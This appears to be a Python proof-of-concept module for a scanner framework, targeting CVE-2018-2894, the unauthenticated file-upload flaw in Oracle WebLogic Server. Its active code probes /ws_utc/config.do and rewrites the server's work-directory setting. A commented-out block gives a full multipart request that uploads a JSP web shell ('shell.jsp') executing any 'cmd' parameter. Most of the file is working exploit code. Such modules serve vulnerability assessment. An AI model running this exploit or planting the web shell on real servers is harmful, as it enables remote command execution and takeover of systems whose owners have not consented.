# coding : utf-8
# @Time : 2022/10/24 16:12
# @Author : hqe
# @File : v_2022_0007_WLS_UPLOAD.py
# @Project : GEngine
from BasePoc import BasePoc
from lib.ReqUtils import req

POC_NAME="WeblogicUpload"

class WeblogicUpload(BasePoc):

    poc_info = {
            'Id': 'v_2022_0007',
            'Name': 'Oracle Fusion Middleware Oracle WebLogic Server组件安全漏洞',
            'Author': 'hqe',
            'Create_date': '2022-07-18',
    }

    vul_info = {
        'Product': 'Oracle',
        'Version': 'Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。',
        'Type': '文件上传',
        'Level': 4,
        'CVE': 'CVE-2018-2894',
        'CNNVD': 'CNNVD-201807-1277',
        'CNVD': 'CNVD-2018-25176',
        'Description': """
                            Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。 
                            WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do
                       """,
        'DisclosureDate': '2018-07-18',
    }

    def verify(self,  *args, **kwargs):
        # port = '7001'
        port = '14877'
        dec_url = "http://" + self.scan_info['Target'] + ":" + port + "/ws_utc/config.do"
        res = req(dec_url, 'get')
        if res.status_code != 200:
            return
        file_url = "http://" + self.scan_info['Target'] + ":" + port + '/ws_utc/resources/setting/options'
        file_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.51',
        }
        file_data = 'setting_id=general&BasicConfigOptions.workDir=%2Fu01%2Foracle%2Fuser_projects%2Fdomains%2Fbase_domain%2Ftmp%2FWSTestPageWorkDir&BasicConfigOptions.proxyHost=&BasicConfigOptions.proxyPort=80'
        res = req(file_url,'post',headers=file_headers,data=file_data)
        if 'Save successfully'  in res.text:
            self.scan_info['Success'] = True

        # post_url = "http://" + self.scan_info['Target'] + ":" + port + '/ws_utc/resources/setting/keystore'
        #
        # headers = {
        #     'Content-Type': 'multipart/form-data;boundary=---------------------------231124593419511046012006515451',
        #     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.51',
        # }

        # post_data = '-----------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_name"  g -----------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_edit_mode"  false -----------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_password_front"  123456 -----------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_password"  123456 -----------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_password_changed"  true -----------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_filename"; filename="shell.jsp" Content-Type: application/octet-stream  <% Runtime.getRuntime().exec(request.getParameter("cmd")); %> -----------------------------231124593419511046012006515451--'
        # post_data = ''
        # post_data += '  --------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_name"'
        # post_data += '  g -----------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_edit_mode"'
        # post_data += '  false -----------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_password_front"'
        # post_data += '  123456 -----------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_password"'
        # post_data += '  123456 -----------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_password_changed"'
        # post_data += '  true -----------------------------231124593419511046012006515451 Content-Disposition: form-data; name="ks_filename"; filename="shell.jsp" Content-Type: application/octet-stream'
        # post_data += '  <% Runtime.getRuntime().exec(request.getParameter("cmd")); %> -----------------------------231124593419511046012006515451--'
        # res = req(post_url, 'post', headers=headers, data=post_data)
        # res = requests.post(url=post_url,headers=headers,data=post_data)
        # log.debug(res.content)
